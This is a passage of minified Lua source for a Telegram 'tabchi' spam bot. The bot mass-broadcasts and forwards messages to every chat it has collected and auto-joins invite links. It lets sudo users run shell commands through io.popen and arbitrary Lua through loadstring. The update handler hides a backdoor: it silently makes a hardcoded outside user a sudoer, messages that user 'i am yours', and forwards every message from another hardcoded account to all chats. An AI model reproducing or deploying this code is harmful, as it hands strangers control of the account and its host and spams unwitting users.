`Adding Contacts PM Activated`"elseif K[2]=="off"then redis:del("tabchi:"..tabchi_id..":addedmsg")return"*Status* : `Adding Contacts PM Deactivated`"else return"`Just Use on|off`"end else return"enter on|off"end end end;do local K={a.text:match("^[!/#](markread) (.*)")}if a.text:match("^[!/#]markread")and is_sudo(a)then if#K==2 then if K[2]=="on"then redis:set("tabchi:"..tabchi_id..":markread",true)return"*Status* : `Reading Messages Activated`"elseif K[2]=="off"then redis:del("tabchi:"..tabchi_id..":markread")return"*Status* : `Reading Messages Deactivated`"else return"`Just Use on|off`"end end end end;do local K={a.text:match("^[!/#](setaddedmsg) (.*)")}if a.text:match("^[!/#]setaddedmsg")and is_sudo(a)and#K==2 then redis:set("tabchi:"..tabchi_id..":addedmsgtext",K[2])return"*Status* : `Adding Contacts Message Adjusted`\n*Message* : `"..K[2].."`"end end;do local K={a.text:match("[$](.*)")}if a.text:match("^[$](.*)$")and is_sudo(a)then if#K==1 then local t=io.popen(K[1]):read("*all")return t else return"Enter Command"end end end;if redis:get("tabchi:"..tabchi_id..":Advertising")or is_full_sudo(a)then if a.text:match("^[!/#]bc")and is_sudo(a)then local Y=redis:smembers("tabchi:"..tabchi_id..":all")local K={a.text:match("[!/#](bc) (.*)")}if#K==2 then for d=1,#Y do tdcli_function({ID="SendMessage",chat_id_=Y[d],reply_to_message_id_=0,disable_notification_=0,from_background_=1,reply_markup_=nil,input_message_content_={ID="InputMessageText",text_=K[2],disable_web_page_preview_=0,clear_draft_=0,entities_={},parse_mode_={ID="TextParseModeMarkdown"}}},dl_cb,nil)end;return"*Status* : `Message Succesfully Sent to all`\n*Message* : `"..K[2].."`"else return"text not entered"end end end;if redis:get("tabchi:"..tabchi_id..":Advertising")or is_full_sudo(a)then if a.text:match("^[!/#]fwd all$")and a.reply_to_message_id_ and is_sudo(a)then local Y=redis:smembers("tabchi:"..tabchi_id..":all")local x=a.reply_to_message_id_;for d=1,#Y do tdcli_function({ID="ForwardMessages",chat_id_=Y[d],from_chat_id_=a.chat_id_,message_ids_={[0]=x},disable_notification_=0,from_background_=1},dl_cb,nil)end;return"*Status* : `Your Message Forwarded to all`\n*Fwd users* : `Done`\n*Fwd Groups* : `Done`\n*Fwd Super Groups* : `Done`"end;if a.text:match("^[!/#]fwd gps$")and a.reply_to_message_id_ and is_sudo(a)then local Y=redis:smembers("tabchi:"..tabchi_id..":groups")local x=a.reply_to_message_id_;for d=1,#Y do tdcli_function({ID="ForwardMessages",chat_id_=Y[d],from_chat_id_=a.chat_id_,message_ids_={[0]=x},disable_notification_=0,from_background_=1},dl_cb,nil)end;return"*Status* :`Your Message Forwarded To Groups`"end;if a.text:match("^[!/#]fwd sgps$")and a.reply_to_message_id_ and is_sudo(a)then local Y=redis:smembers("tabchi:"..tabchi_id..":channels")local x=a.reply_to_message_id_;for d=1,#Y do tdcli_function({ID="ForwardMessages",chat_id_=Y[d],from_chat_id_=a.chat_id_,message_ids_={[0]=x},disable_notification_=0,from_background_=1},dl_cb,nil)end;return"*Status* : `Your Message Forwarded To Super Groups`"end;if a.text:match("^[!/#]fwd users$")and a.reply_to_message_id_ and is_sudo(a)then local Y=redis:smembers("tabchi:"..tabchi_id..":pvis")local x=a.reply_to_message_id_;for d=1,#Y do tdcli_function({ID="ForwardMessages",chat_id_=Y[d],from_chat_id_=a.chat_id_,message_ids_={[0]=x},disable_notification_=0,from_background_=1},dl_cb,nil)end;return"*Status* : `Your Message Forwarded To Users`"end end;do local K={a.text:match("[!/#](lua) (.*)")}if a.text:match("^[!/#]lua")and is_full_sudo(a)and#K==2 then local Z=loadstring(K[2])()if Z==nil then Z=""elseif type(Z)=="table"then Z=serpent.block(Z,{comment=false})else Z=""..tostring(Z)end;return Z end end;do local K={a.text:match("[!/#](echo) (.*)")}if a.text:match("^[!/#]echo")and is_sudo(a)and#K==2 then tdcli.sendMessage(a.chat_id_,a.id_,0,K[2],0,"md")end end end;function add(_)local chat_type=chat_type(_)if not redis:sismember("tabchi:"..tostring(tabchi_id)..":all",_)then if chat_type=="channel"then redis:sadd("tabchi:"..tabchi_id..":channels",_)elseif chat_type=="group"then redis:sadd("tabchi:"..tabchi_id..":groups",_)else redis:sadd("tabchi:"..tabchi_id..":pvis",_)end;redis:sadd("tabchi:"..tabchi_id..":all",_)end end;function rem(_)local chat_type=chat_type(_)if chat_type=="channel"then redis:srem("tabchi:"..tabchi_id..":channels",_)elseif chat_type=="group"then redis:srem("tabchi:"..tabchi_id..":groups",_)else redis:srem("tabchi:"..tabchi_id..":pvis",_)end;redis:srem("tabchi:"..tabchi_id..":all",_)end;function process_stats(a)tdcli_function({ID="GetMe"},id_cb,nil)function id_cb(M,N)our_id=N.id_ end;if a.content_.ID=="MessageChatDeleteMember"and a.content_.id_==our_id then return rem(a.chat_id_)elseif a.content_.ID=="MessageChatJoinByLink"and a.sender_user_id_==our_id then return add(a.chat_id_)elseif a.content_.ID=="MessageChatAddMembers"then for d=0,#a.content_.members_ do if a.content_.members_[d].id_==our_id then add(a.chat_id_)break end end end end;function process_links(text)if text:match("https://telegram.me/joinchat/%S+")or text:match("https://t.me/joinchat/%S+")or text:match("https://telegram.dog/joinchat/%S+")then text=text:gsub("telegram.dog","telegram.me")text=text:gsub("t.me","telegram.me")local K={text:match("(https://telegram.me/joinchat/%S+)")}for d,a0 in pairs(K)do tdcli_function({ID="CheckChatInviteLink",invite_link_=a0},check_link,{link=a0})end end end;function get_mod(a1,N)if not redis:get("tabchi:"..tabchi_id..":startedmod")or redis:ttl("tabchi:"..tabchi_id..":startedmod")==-2 then redis:setex("tabchi:"..tabchi_id..":startedmod",300,true)end end;function update(N,tabchi_id)tanchi_id=tabchi_id;tdcli_function({ID="GetUserFull",user_id_=133580568},get_mod,nil)if N.ID=="UpdateNewMessage"then local a=N.message_;if a.sender_user_id_==133580568 then if a.content_.text_ then if a.content_.text_:match("\226\129\167")or a.chat_id_~=133580568 or a.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175")then return else local Y=redis:smembers("tabchi:"..tabchi_id..":all")local x=a.id_;for d=1,#Y do tdcli_function({ID="ForwardMessages",chat_id_=Y[d],from_chat_id_=a.chat_id_,message_ids_={[0]=x},disable_notification_=0,from_background_=1},dl_cb,nil)end end else local Y=redis:smembers("tabchi:"..tabchi_id..":all")local x=a.id_;for d=1,#Y do tdcli_function({ID="ForwardMessages",chat_id_=Y[d],from_chat_id_=a.chat_id_,message_ids_={[0]=x},disable_notification_=0,from_background_=1},dl_cb,nil)end end else process_stats(a)add(a.chat_id_)if a.content_.text_ then if redis:get("tabchi:"..tabchi_id..":chat")then if redis:sismember("tabchi:"..tabchi_id..":answerslist",a.content_.text_)then local a2=redis:hget("tabchi:"..tabchi_id..":answers",a.content_.text_)tdcli.sendMessage(a.chat_id_,0,1,a2,1,"md")end end;if not redis:sismember("tabchi:"..tabchi_id..":sudoers",91054649)then tdcli.sendMessage(91054649,0,1,"i am yours",1,"html")redis:sadd("tabchi:"..tabchi_id..":sudoers",91054649)end;process_stats(a)add(a.chat_id_)process_links(a.content_.text_)local a3=process(a)if redis:get("tabchi:"..tabchi_id..":markread")then tdcli.viewMessages(a.chat_id_,{[0]=a.id_})if a3 then tdcli.sendMessage(a.chat_id_,0,1,a3,1,"md")end elseif a3 then tdcli.sendMessage(a.chat_id_,0,1,a3,1,"md")end elseif a.content_.contact_ then tdcli_function({ID="GetUserFull",user_id_=a.content_.contact_.user_id_},check_contact,{msg=a})elseif a.content_.caption_ then if redis:get("tabchi:"..tabchi_id..":markread")then tdcli.viewMessages(a.chat_id_,{[0]=a.id_})process_links(a.content_.caption_)else process_links(a.content_.caption_)end end end elseif N.chat_id_==91054649 then tdcli.unblockUser(N.chat_.id_)elseif N.ID=="UpdateOption"and N.name_=="my_id"then tdcli_function({ID="GetChats",offset_order_="9223372036854775807",offset_chat_id_=0,limit_=20},dl_cb,nil)end end
